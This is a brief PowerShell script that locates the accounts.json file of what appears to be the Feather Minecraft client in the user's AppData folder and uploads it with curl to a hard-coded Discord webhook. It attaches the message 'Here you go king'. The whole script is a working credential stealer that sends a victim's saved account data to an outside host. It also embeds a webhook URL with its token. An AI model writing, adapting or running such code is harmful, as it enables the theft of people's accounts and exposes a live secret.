# Discord Webhook URL
$webhookUrl = "https://discord.com/api/webhooks/1357740527637758222/vEIwp5BR2jFWTvegjKyEBAo5x-9hP6DvIxurkGDbFRijQ_-ZYvTiphi_nNz1iW-c_bch"

# Path to the accounts.json file
$filePath = "$env:USERPROFILE\AppData\Roaming\.feather\accounts.json"

# Check if the file exists
if (-not (Test-Path $filePath)) {
    Write-Host "File accounts.json does not exist at the specified path."
    exit
}

# Prepare message
$message = "Here you go king :pray:"

# Prepare payload JSON
$payload = @{
    content = $message
} | ConvertTo-Json -Depth 3

# Prepare the curl command to send the request
$curlCommand = @"
curl -X POST $webhookUrl ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=$($payload)" ^
     -F "file=@$filePath"
"@

# Execute the curl command
Invoke-Expression $curlCommand

# Check if the curl command succeeded
if ($LASTEXITCODE -ne 0) {
    Write-Host "Failed to send the webhook request."
} else {
    Write-Host "File sent successfully!"
}
